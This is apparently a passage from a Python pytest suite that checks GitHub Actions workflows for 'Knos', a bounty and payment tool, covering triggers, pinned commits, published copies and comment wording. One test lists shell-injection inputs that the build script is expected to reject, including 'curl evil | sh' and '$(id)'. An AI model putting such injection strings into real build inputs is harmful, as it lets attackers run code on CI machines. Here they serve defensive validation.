    ("another command on a pull request", _comment("/knos address 4G3cznCnwCUPBCZwzKiLupjdgB5pSoCcGWNGuFv4TYFo", pull=True), None, {"command"}),
    ("a comment on a pull request that only talks about settling", _comment("when will /knos settle run?", pull=True), SETTLE, set()),
    ("a new issue", _issue("The slug keeps punctuation.\n\nSteps: ..."), None, set()),
    ("a new issue with no description", _issue(None), None, set()),
    ("a new issue that funds itself", _issue("The slug keeps punctuation.\n\n/knos fund 20\n"), None, {"command"}),
    ("a new issue that funds itself, the old word", _issue("/knos bounty 12.5"), None, {"command"}),
    ("a merge: a push to the default branch", _push(), None, {"settle"}),
    ("a merge where the default branch is called master", _push("refs/heads/master", default="master"), None, {"settle"}),
    ("a merge by the merge queue", _push(actor="github-merge-queue[bot]"), None, {"settle"}),
    ("a push to another branch", _push("refs/heads/feature/x"), None, set()),
    ("a push to a branch whose name ends like the default one", _push("refs/heads/not-main"), None, set()),
    ("a tag", _push("refs/tags/v1.0.0"), None, set()),
    ("a run started by hand", _event("workflow_dispatch", {"inputs": {"pull": "12"}}), None, {"settle"}),
    ("the check passed", _checked("success"), None, {"review"}),
    ("the check failed", _checked("failure"), None, {"review"}),
    ("the check waits for a maintainer's approval", _checked("action_required"), None, set()),
    ("the check was replaced by a newer run", _checked("cancelled"), None, set()),
    ("the check never started", _checked("startup_failure"), None, set()),
    ("a workflow of the same name that a push started", _checked("success", event="push"), None, set()),
]


@pytest.mark.parametrize("what,context,said,want", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_ordinary_comments_and_pushes_start_no_job_and_each_event_starts_the_right_one(what, context, said, want):
    caller = _doc(EXAMPLES / "knos-workflow.yml")
    assert _started(caller, context, said) == want
    assert _started(caller, context, said, cancelled=True) == set()          # a cancelled run pays nothing
    # What a calling job starts is exactly one job of the workflow it calls: the two files never disagree.
    first = {name: {job for job, spec in _jobs(name).items() if "needs" not in spec and runs(spec.get("if"), context)}
             for name in ("fund.yml", "prove.yml")}
    for job in want:
        assert first[caller["jobs"][job]["uses"][len(CALLED):].split("@")[0]] == {job}, job


def test_the_called_workflows_refuse_by_themselves_what_no_caller_should_send():
    """Their own conditions do not depend on a caller's: whatever file calls them, an edited comment commands nothing,
    and a push that is not to the default branch settles nothing."""
    command, prove = _jobs("fund.yml")["command"]["if"], _jobs("prove.yml")
    assert runs(command, _comment("/knos take")) and runs(command, _issue("/knos fund 5"))
    for refused in (_comment("/knos take", action="edited"), _comment("/knos take", action="deleted"), _issue("/knos fund 5", action="edited"),
                    _push(), _checked(), _event("pull_request", {"action": "opened"})):
        assert not runs(command, refused), refused["github"]["event_name"]
    settle, review = prove["settle"]["if"], prove["review"]["if"]
    assert runs(settle, _push()) and runs(settle, _event("workflow_dispatch", {})) and runs(settle, _comment("/knos settle", pull=True))
    for refused in (_push("refs/heads/feature/x"), _push("refs/tags/v1"), _comment("/knos settle", pull=True, action="edited"),
                    _comment("/knos settle"), _issue("/knos fund 5"), _checked(),
                    _event("pull_request", {"action": "closed", "pull_request": {"merged": True}})):
        assert not runs(settle, refused), refused["github"]
    assert runs(review, _checked("success")) and runs(review, _checked("failure"))
    for refused in (_checked("action_required"), _checked("cancelled"), _checked("skipped"), _checked("success", event="push"),
                    _checked("success", event="schedule"), _push(), _comment("/knos settle", pull=True)):
        assert not runs(review, refused), refused["github"]["event"]
    assert sorted(j for j, spec in prove.items() if "needs" not in spec) == ["review", "settle"]


def test_the_file_a_repository_installs_listens_for_what_decision_6_names_and_nothing_else():
    doc = _doc(EXAMPLES / "knos-workflow.yml")
    assert doc["name"] == "knos" and set(doc["on"]) == {"issue_comment", "issues", "push", "workflow_dispatch", "workflow_run"}
    assert doc["on"]["issue_comment"] == {"types": ["created"]} and doc["on"]["issues"] == {"types": ["opened"]}
    assert doc["on"]["push"] == {"branches": ["**"]}                       # branches, never tags
    assert doc["on"]["workflow_dispatch"]["inputs"] == {"pull": {"description": doc["on"]["workflow_dispatch"]["inputs"]["pull"]["description"],
                                                                 "required": True, "type": "number"}}
    check = _doc(EXAMPLES / "knos-check.yml")
    # the review waits for the workflow of the check's name, and only one workflow in this repository has that name
    assert doc["on"]["workflow_run"] == {"workflows": [check["name"]], "types": ["completed"]} and check["name"] == "knos check"
    assert [p.name for p in WF.glob("*.yml") if _doc(p).get("name") == check["name"]] == ["knos-check.yml"]
    assert set(check["on"]) == {"pull_request"} and "edited" in check["on"]["pull_request"]["types"]   # a description changed is a claim changed
    jobs = doc["jobs"]
    assert list(jobs) == ["command", "settle", "review"] and list(check["jobs"]) == ["check"]
    assert [jobs[j]["uses"].split("@")[0] for j in jobs] == [CALLED + "fund.yml", CALLED + "prove.yml", CALLED + "prove.yml"]
    assert check["jobs"]["check"]["uses"].startswith(f"{CALLED}check.yml@")
    assert jobs["settle"]["needs"] == "command" and "needs" not in jobs["review"] and "needs" not in jobs["command"]
    # the command says when a payment follows (`/knos settle`, a tip that was funded): the comment's words are not read twice
    assert "needs.command.outputs.settle != ''" in jobs["settle"]["if"] and "comment.body" not in jobs["settle"]["if"]
    for job in (*jobs.values(), *check["jobs"].values()):
        assert set(job) <= {"name", "needs", "if", "permissions", "uses", "secrets"}, "a thin job: when to call, what it may do, what to call"


def test_knos_own_jobs_have_the_names_the_judge_knows_as_its_own():
    """A check run that is Knos's own is never evidence about a pull request, and a bounty cannot require one. GitHub
    names a called job "<calling job's name> / <called job>"."""
    from knos import terms
    names = [f"{spec.get('name', caller)} / {job}" for example in OWN for caller, spec in _doc(EXAMPLES / example)["jobs"].items()
             for job in _jobs(spec["uses"][len(CALLED):].split("@")[0])]
    assert sorted(set(names)) == ["check / claims", "knos command / command", "knos review / attest", "knos review / judge",
                                  "knos review / review", "knos review / settle", "knos settle / attest", "knos settle / judge",
                                  "knos settle / review", "knos settle / settle"]
    assert all(terms.ours({"name": n}, "") for n in names), [n for n in names if not terms.ours({"name": n}, "")]
    assert not terms.ours({"name": "settle / settle"}, "") and not terms.ours({"name": "test"}, "")      # why the names matter
    assert all("name" not in job for name in REUSABLE for job in _jobs(name).values())      # a called job's name is its key


# ---- the claim file ----------------------------------------------------------------------------------------------------

def test_the_claim_caller_names_the_pinned_commit_and_takes_the_address_from_the_right_place():
    ids = json.loads((ROOT / "programs-v2" / "program_ids.json").read_text(encoding="utf-8"))
    doc = _doc(EXAMPLES / "knos-claim.yml")
    [job] = doc["jobs"].values()
    assert doc["name"] == "knos claim" and list(doc["jobs"]) == ["claim"]
    assert job["uses"] == f"{ROTATE}claim.yml@{ids['claim_sha']}" == f"{ROTATE}claim.yml@80e796d341f65060767939c4e65a38ede5fa1ac8"
    lib = (ROOT / "programs-v2" / "knos_pay" / "src" / "lib.rs").read_text(encoding="utf-8")
    assert f'CLAIM_SHA: &[u8; 40] = b"{ids["claim_sha"]}"' in lib and f'CLAIM_REF: &[u8] = b"{ROTATE}claim.yml@"' in lib
    assert job["permissions"] == {"id-token": "write", "issues": "write"} and set(job) == {"permissions", "uses", "with"}
    # binding a wallet is by hand only (the program takes only a workflow_dispatch bind token): no push, no condition
    # that reads the repository's description, and the address is the one input
    assert set(doc["on"]) == {"workflow_dispatch"}
    assert doc["on"]["workflow_dispatch"]["inputs"]["address"]["required"] is True
    assert job["with"] == {"address": "${{ inputs.address }}"}
    text = (EXAMPLES / "knos-claim.yml").read_text(encoding="utf-8")
    code = "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))
    assert not re.search(r"repository\.description|\bpush\b|run_number|event\.repository", code)
    said = _comments(EXAMPLES / "knos-claim.yml")
    assert "by hand only" in said and "an address that arrives in a link could be someone else's" in said.lower()
    assert "Actions > knos claim > Run workflow" in said and "`knos claim <address>`" in said
    assert "Check the description before you create the repository" not in said and "first run" not in said


# ---- the published copies, and the one commit everything names -----------------------------------------------------------

def test_the_published_set_is_the_source_byte_for_byte(tmp_path, capsys):
    pub = _script("pinned_workflows")
    out = tmp_path / "knos-workflows"
    assert pub.main(["build", str(out)]) == 0
    files = sorted(p.relative_to(out).as_posix() for p in out.rglob("*") if p.is_file())
    assert files == [".github/workflows/check.yml", ".github/workflows/fund.yml", ".github/workflows/prove.yml", "LICENSE", "README.md"]
    for name in REUSABLE:
        assert (out / ".github" / "workflows" / name).read_bytes() == (WF / name).read_bytes(), name
    assert (out / "LICENSE").read_bytes() == (ROOT / "LICENSE").read_bytes()
    readme = (out / "README.md").read_text(encoding="utf-8")
    assert f"knos {_release()} from PyPI" in readme and "REHEARSAL" not in readme and all(f"`.github/workflows/{n}`" in readme for n in REUSABLE)
    assert "names this repository and one commit of it" in readme and not re.search(r"\bimmutable\b|nobody can change", readme, re.I)
    assert pub.REPO == CALLED.split("/.github")[0] and pub.main(["check", str(out)]) == 0
    assert "byte for byte" in capsys.readouterr().out
    # check sees one changed byte, a missing file and a file that does not belong; a checkout's .git is not looked at
    (out / ".git").mkdir()
    (out / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    assert pub.main(["check", str(out)]) == 0
    prove = out / ".github" / "workflows" / "prove.yml"
    prove.write_bytes(prove.read_bytes().replace(b"--sandbox require", b"--sandbox auto"))
    (out / ".github" / "workflows" / "relay.yml").write_text("name: stray\n", encoding="utf-8")
    (out / "LICENSE").unlink()
    capsys.readouterr()
    assert pub.main(["check", str(out)]) == 1
    said = capsys.readouterr().out
    assert ".github/workflows/prove.yml is not the file this repository publishes" in said and "LICENSE is missing" in said
    assert ".github/workflows/relay.yml is not part of the published set" in said and "fund.yml" not in said
    assert pub.main(["build", str(out)]) == 0 and pub.main(["check", str(out)]) == 1       # writing again repairs; a stray file is still said
    for bad in ([], ["build"], ["stamp"], ["check", "--source", "knos"], ["publish", str(out)]):
        with pytest.raises(SystemExit):
            pub.main(bad)


def test_a_rehearsal_variant_differs_in_the_requirement_that_is_installed_and_in_nothing_else(tmp_path, capsys):
    pub = _script("pinned_workflows")
    spec = "git+https://github.com/drexthealpha/Knos@" + "ab" * 20
    out = tmp_path / "staging"
    assert pub.main(["build", str(out), "--source", spec]) == 0 and "REHEARSAL" in capsys.readouterr().out
    for name in REUSABLE:
        source, got = (WF / name).read_text(encoding="utf-8").splitlines(), (out / ".github" / "workflows" / name).read_text(encoding="utf-8").splitlines()
        assert len(source) == len(got), name
        changed = [(a, b) for a, b in zip(source, got) if a != b]
        # the line that installs, once a job, and only the requirement in it
        assert len(changed) == len(_jobs(name)) and all(
            a.lstrip().startswith("run: uv tool install ") and b == a.replace(f'"knos=={_release()}"', f'"{spec}"') for a, b in changed), (name, changed)
        installs = [s["run"] for job in _doc(out / ".github" / "workflows" / name)["jobs"].values() for s in job["steps"]
                    if str(s.get("run", "")).startswith("uv tool install ")]
        assert installs and all(run.endswith(f' "{spec}"') for run in installs), name
    assert "REHEARSAL VARIANT" in (out / "README.md").read_text(encoding="utf-8") and spec in (out / "README.md").read_text(encoding="utf-8")
    # a staging checkout is checked against the same variant, and is never taken for the published set
    assert pub.main(["check", str(out), "--source", spec]) == 0 and pub.main(["check", str(out)]) == 1
    capsys.readouterr()
    for bad in ('knos"; curl evil | sh; "', "knos==0.3.12 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
        with pytest.raises(SystemExit):
            pub.main(["build", str(tmp_path / "bad"), "--source", bad])
    assert not (tmp_path / "bad").exists()


def _tree(tmp_path: Path, pub) -> Path:
    """A copy of the files that name the published commit, for `stamp` to write into."""
    root = tmp_path / "repo"
    for rel in ["examples", ".github/workflows", "web/front.js", "src/knos/settle/knos-claim.yml", "README.md", "LICENSE"]:
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (shutil.copytree if (ROOT / rel).is_dir() else shutil.copyfile)(ROOT / rel, root / rel)
    now = pub.pin()
    (root / "docs" / "img").mkdir(parents=True)
    (root / "docs" / "INSTALL.md").write_text(f"    uses: {CALLED}fund.yml@{now}\n\nThe commit is `{now}`.\n", encoding="utf-8")
    (root / "docs" / "img" / "logo.png").write_bytes(b"\x89PNG\r\n\xff\xfe" + now.encode())      # not text: left alone
    return root


def test_stamp_names_one_commit_everywhere_and_check_says_every_place_that_disagrees(tmp_path, monkeypatch, capsys):
    pub = _script("pinned_workflows")
    root = _tree(tmp_path, pub)
    before = pub.pin()
    monkeypatch.setattr(pub, "ROOT", root)
    assert pub.main(["check"]) == 0
    first, second = "ab" * 20, "cd" * 20
    named = [root / "examples" / "knos-workflow.yml", root / "examples" / "knos-check.yml", root / ".github" / "workflows" / "knos.yml",
             root / ".github" / "workflows" / "knos-check.yml", root / "docs" / "INSTALL.md", root / "web" / "front.js"]
    for sha, old in ((first, before), (second, first)):        # a release, then the next one
        assert pub.main(["stamp", sha]) == 0 and "Named drexthealpha/knos-workflows@" + sha in capsys.readouterr().out
        for path in named:
            text = path.read_text(encoding="utf-8")
            assert f"{CALLED}fund.yml@{sha}" in text or f"{CALLED}check.yml@{sha}" in text, path.name
            assert f"@{old}" not in text and (path.name == "front.js" or old not in text), path.name
        assert f"The commit is `{sha}`." in (root / "docs" / "INSTALL.md").read_text(encoding="utf-8")
        assert pub.pin() == sha and pub.main(["check"]) == 0 and sha in capsys.readouterr().out
        for example, own in OWN.items():
            assert (root / "examples" / example).read_bytes() == (root / ".github" / "workflows" / own).read_bytes()
        js = (root / "web" / "front.js").read_text(encoding="utf-8")
        body = re.search(r"export const WORKFLOW = `(.*?)`;\n", js, re.DOTALL).group(1)
        assert re.sub(r"\\(.)", r"\1", body, flags=re.DOTALL) == (root / "examples" / "knos-workflow.yml").read_text(encoding="utf-8")
    assert before.encode() in (root / "docs" / "img" / "logo.png").read_bytes()
    # the reusable workflows themselves name no commit of their own repository: stamping never touches them
    for name in REUSABLE:
        assert (root / ".github" / "workflows" / name).read_bytes() == (WF / name).read_bytes()
    assert pub.stamp(second) == []                                     # stamping the same commit again changes nothing
    for bad in ("main", "v0.3.12", second[:39], second.upper(), ""):
        with pytest.raises(SystemExit):
            pub.main(["stamp", bad])
    # check: a copy edited by hand, a document left at another commit or at the placeholder, a workflow nobody publishes
    own = root / ".github" / "workflows" / "knos.yml"
    own.write_text(own.read_text(encoding="utf-8").replace("needs: command", "needs:  command"), encoding="utf-8")
    (root / "docs" / "OLD.md").write_text(f"{CALLED}prove.yml@{first} and {CALLED}relay.yml@{second}, once {PLACEHOLDER}\n", encoding="utf-8")
    page = root / "web" / "front.js"
    page.write_text(page.read_text(encoding="utf-8").replace("types: [created]", "types: [created, edited]"), encoding="utf-8")
    capsys.readouterr()
    assert pub.main(["check"]) == 1
    said = capsys.readouterr().out
    for line in (".github/workflows/knos.yml is not examples/knos-workflow.yml", f"docs/OLD.md names drexthealpha/knos-workflows at {first}",
                 "docs/OLD.md names relay.yml, which drexthealpha/knos-workflows does not publish", f"docs/OLD.md still says {PLACEHOLDER}",
                 "web/front.js does not hand out examples/"):
        assert line in said, line
    assert "docs/INSTALL.md" not in said and "examples/" + "knos-check.yml" not in said


def test_the_site_templates_are_the_examples_byte_for_byte(tmp_path, monkeypatch):
    """scripts/front_workflow.py writes the two files a repository installs into web/front.js as template literals.
    Evaluated as JavaScript would, each is the example itself, backslashes, backticks and `${{ }}` included."""
    front = _script("front_workflow")
    assert front.main(["--check"]) == 0, "web/front.js does not hand out examples/: run python scripts/front_workflow.py"
    page = tmp_path / "front.js"
    page.write_text('export const KNOS_WORKFLOWS_SHA = "old";\nexport const WORKFLOW = `old ${x}`;\nconst kept = 1;\n'
                    "export const CHECK_WORKFLOW = `old`;\nexport function f() {}\n", encoding="utf-8")
    monkeypatch.setattr(front, "FRONT", page)
    assert front.main(["--check"]) == 1 and "old ${x}" in page.read_text(encoding="utf-8")          # --check writes nothing
    assert front.main([]) == 0 and front.main(["--check"]) == 0
    js = page.read_text(encoding="utf-8")

    def evaluated(name: str) -> str:
        body = re.search(r"export const " + name + r" = `(.*?)`;\n", js, re.DOTALL).group(1)
        assert not re.search(r"(?<!\\)(?:\\\\)*\$\{", body) and not re.search(r"(?<!\\)(?:\\\\)*`", body), "something JavaScript would evaluate"
        return re.sub(r"\\(.)", r"\1", body, flags=re.DOTALL)
    assert evaluated("WORKFLOW") == (EXAMPLES / "knos-workflow.yml").read_text(encoding="utf-8")
    assert evaluated("CHECK_WORKFLOW") == (EXAMPLES / "knos-check.yml").read_text(encoding="utf-8")
    pin = front.pin([(EXAMPLES / n).read_text(encoding="utf-8") for n in OWN])
    assert (pin == PLACEHOLDER or re.fullmatch(SHA, pin)) and f'export const KNOS_WORKFLOWS_SHA = "{pin}";' in js
    assert "const kept = 1;" in js and "export function f() {}" in js
    page.write_text("export const WORKFLOW = `x`;\n", encoding="utf-8")
    with pytest.raises(SystemExit):
        front.main(["--check"])                                                  # a page that lost a template is said, not passed


# ---- Knos's own key workflow --------------------------------------------------------------------------------------------

def test_the_key_workflow_calls_the_pinned_rotate_workflow_on_the_events_the_second_deployment_accepts():
    doc = _doc(WF / "keys.yml")
    [job] = doc["jobs"].values()
    pins = (ROOT / "programs-v2" / "knos_oidc" / "src" / "pins.rs").read_text(encoding="utf-8")
    sha = re.search(r'pub const ROTATE_SHA: &\[u8; 40\] = b"([0-9a-f]{40})";', pins).group(1)
    assert job["uses"] == f"{ROTATE}rotate.yml@{sha}" and set(job) == {"permissions", "uses"}
    assert sha == re.search(r'pub const ROTATE_SHA: &\[u8; 40\] = b"([0-9a-f]{40})";',
                            (ROOT / "programs" / "knos_oidc" / "src" / "pins.rs").read_text(encoding="utf-8")).group(1)
    # the second deployment takes a key token only from a scheduled run or one started by hand
    events = set(re.findall(r'b"(\w+)"', re.search(r"pub const ATTEST_EVENTS.*", pins).group(0)))
    assert set(doc["on"]) == events == {"schedule", "workflow_dispatch"}


# ---- what the comments must go on saying ---------------------------------------------------------------------------------

def test_the_files_an_adopter_reads_say_what_each_trigger_does_what_they_can_touch_and_why_they_are_safe():
    banned = re.compile(r"\bimmutable\b|nobody can change", re.I)       # never said of the second deployment
    for example in ("knos-workflow.yml", "knos-check.yml", "knos-claim.yml"):
        doc, text = _doc(EXAMPLES / example), (EXAMPLES / example).read_text(encoding="utf-8")
        head = text.split("\nname:")[0]
        assert all(ln.startswith("#") for ln in head.splitlines()), f"{example} opens with what an adopter reads"
        said = _comments(EXAMPLES / example)
        for trigger in doc["on"]:
            assert f"(`{trigger}`)" in head, f"{example} does not say what `{trigger}` does"
        assert re.search(r"needs no secret|No secret is needed", said), example
        assert "What it can do in this repository" in said and "What it cannot do" in said, example
        assert not banned.search(text), (example, banned.search(text).group(0))
    said = _comments(EXAMPLES / "knos-workflow.yml")
    assert "It does not use `pull_request_target`" in said and "No job that can ask for a signed statement checks out or runs anything from a pull request" in said
    assert "as it is at the pushed commit" in said and "workflow's own token starts no run" in said and "[skip ci]" in said
    assert "test USDC" in said and "never the pull request's" in said and "KNOS_RELAY_KEY" in said
    assert "first-time contributor" in _comments(EXAMPLES / "knos-check.yml") and "advice" in _comments(EXAMPLES / "knos-check.yml")
    claim = _comments(EXAMPLES / "knos-claim.yml")
    assert "by hand only" in claim and "an address that arrives in a link could be someone else's" in claim.lower()
    for name in REUSABLE:
        said, text = _comments(WF / name), (WF / name).read_text(encoding="utf-8")
        assert "sees the caller's event" in said and "takes no inputs" in said and not banned.search(text), name
    prove = _comments(WF / "prove.yml")
    assert "A push made with a workflow's own token (GITHUB_TOKEN) starts no run at all" in prove
    assert "none of its artifacts, outputs or logs is read" in prove and "`workflow_run.pull_requests` is empty" in prove


# ---- actionlint -------------------------------------------------------------------------------------------------------

# Two keys GitHub's workflow syntax has that actionlint 1.7.12 does not know yet: `queue` in a concurrency group
# (every waiting run keeps its turn) and a job's `cache-mode` (what it may do with the Actions cache).
NEWER_SYNTAX = ('unexpected key "queue" for "concurrency" section', 'unexpected key "cache-mode" for "job" section')


def test_actionlint_passes_on_every_workflow():
    exe = os.environ.get("ACTIONLINT") or shutil.which("actionlint")
    if exe and Path(exe).is_dir():
        exe = str(Path(exe) / "actionlint")
    if not exe or not Path(exe).is_file():
        pytest.skip("actionlint is not installed (put it on PATH, or name it in ACTIONLINT)")
    ignore = [arg for message in NEWER_SYNTAX for arg in ("-ignore", message)]
    files = [str(p.relative_to(ROOT)) for p in _files()]
    got = subprocess.run([exe, "-no-color", "-shellcheck=", "-pyflakes=", *ignore, *files], cwd=str(ROOT), capture_output=True, text=True, check=False)
    assert got.returncode == 0, got.stdout + got.stderr
    # and the two exceptions are still needed, by Knos's files and only for those keys
    bare = subprocess.run([exe, "-no-color", "-shellcheck=", "-pyflakes=", *files], cwd=str(ROOT), capture_output=True, text=True, check=False)
    complaints = [ln for ln in bare.stdout.splitlines() if re.match(r"\S+:\d+:\d+: ", ln)]
    assert all(any(m in ln for m in NEWER_SYNTAX) and ln.split(":")[0].endswith(REUSABLE) for ln in complaints), complaints
